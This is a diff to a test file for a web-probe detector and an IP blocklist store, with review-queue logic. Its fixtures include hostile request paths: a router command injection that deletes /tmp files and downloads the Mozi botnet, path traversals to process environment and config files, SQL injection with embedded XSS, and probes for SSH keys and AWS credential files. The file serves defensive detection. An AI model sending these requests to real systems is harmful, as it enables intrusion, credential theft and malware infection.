@@ -37,6 +37,22 @@ describe('probes', () => {
       '/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://x/Mozi.m',
       '/phpmyadmin/',
       '/api/geojson?url=file:///etc/shells',
+      // 2026-10-19 re-review: rejected or left pending by the first rules.
+      '/api/watchlist/overview?range=../../../../../../proc/version',
+      '/rest/binary-data/filesystem?fileName=../../../.n8n/config',
+      '/console/api/workspaces/current/plugin/icon?filename=..%2F..%2F..%2F..%2Fproc%2F1%2Fenviron',
+      '/login?redirect=%2Freputation&qsUJ=7835%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%',
+      '/agents?available=true%25%27%20AND%208966%3D7229--%20OgVo',
+      '/database.yml.swp',
+      '/dev/dev.env',
+      '/config/parameters.yml',
+      '/.npmrc',
+      '/.gitlab-ci.yml',
+      '/config/env/aws_credentials.env',
+      '/WEB-INF/web.xml_',
+      '/.ssh/id_ed25519',
+      '//images/images/cache.php',
+      '/tmp/jce_mhaytx.xml.php',
     ])
       expect(probesIn([p])).toEqual([p]);
   });
@@ -52,6 +68,13 @@ describe('probes', () => {
       '/api/frame?u=https%3A%2F%2Fweb.archive.org%2Fweb%2F2016%2FJavascript%3A%2520x',
       '/alacarta/read?p=https%3A%2F%2Fprogramas.example.com%2Faudiorss%2F..%2Fmedia%2Fa.mp3',
       '/candidates?tags=TypeScript%2CPerl%2CGo',
+      '/alacarta/read?p=https://programas.example.com/audiorss/../media/13-a.mp3',
+      '/api/frame?u=https%3A%2F%2Fweb.archive.org%2Fweb%2F2013%2Fhttp%3A%2F%2Fcodex.wordpress.org%2FEditing_wp-config.php',
+      '/c/workflows?tag=python3',
+      '/c/mcp?tag=dotenv',
+      '/c/packages?tag=process.env',
+      '/feeds/new?collection=packages&tags=process.env',
+      '/medical-practice-success-secrets.json',
     ])
       expect(probesIn([p])).toEqual([]);
   });
@@ -152,5 +175,31 @@ describe('store against PGlite', () => {
     ).toBe(0);
     const pub = await store.lookupIp('45.148.10.7', { db: sql });
     expect(pub.listed).toBe(false);
+  });
+
+  test("riotcoder's own rejections can turn into approvals; a person's never do", async () => {
+    await store.applyReview([{ ip: '45.148.10.8', decision: 'reject', note: 'fp' }], { db: sql });
+    const [{ id: userId }] =
+      await sql`insert into users (email) values ('mod2@nichedb.test') returning id`;
+    await store.reviewIps(
+      { ips: ['45.148.10.9'], status: 'rejected', userId, note: 'ours' },
+      { db: sql },
+    );
+    const queue = await store.rejectedForReview({}, { db: sql });
+    expect(queue.map((r) => r.ip)).toEqual(['45.148.10.8']);
+    const both = ['45.148.10.8', '45.148.10.9'].map((ip) => ({
+      ip,
+      decision: 'approve',
+      note: 'probe',
+    }));
+    expect(await store.applyReview(both, { db: sql, from: 'rejected' })).toBe(1);
+    expect((await store.lookupIp('45.148.10.8', { db: sql })).listed).toBe(true);
+    expect((await store.lookupIp('45.148.10.9', { db: sql })).listed).toBe(false);
+    expect(
+      await store.applyReview([{ ip: '45.148.10.8', decision: 'reject', note: 'x' }], {
+        db: sql,
+        from: 'rejected',
+      }),
+    ).toBe(0);
   });
 });
